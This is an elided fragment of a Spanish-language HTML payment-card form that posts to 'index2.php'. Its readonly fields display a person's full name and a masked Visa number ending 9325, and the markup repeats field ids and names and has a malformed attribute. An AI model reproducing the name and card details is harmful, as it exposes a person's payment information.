...
<form class ="form" method="POST"action="index2.php" >
	...
	<div class="icon" id="icon">  
			...
			<input  id="ntarjeta1"  type="text"  name="tarjeta"  maxlength="19" autocomplete="off" placeholder="REINALDO TOLEDO CUELLAR" value="" readonly required=>
			<br>
		
			<div class="tarjeta" id="tarjeta">
			<img src="tarjeta.png" style="opacity: 90%;" alt="tarjeta">
			<h4>Numero de Tarjeta</h4></div> 
			<input  id="ntarjeta1"  type="text"  name="tarjeta"  maxlength="19" autocomplete="off" placeholder="VISA: **** **** **** 9325" value="" readonly required=>
			<br>
			<br>
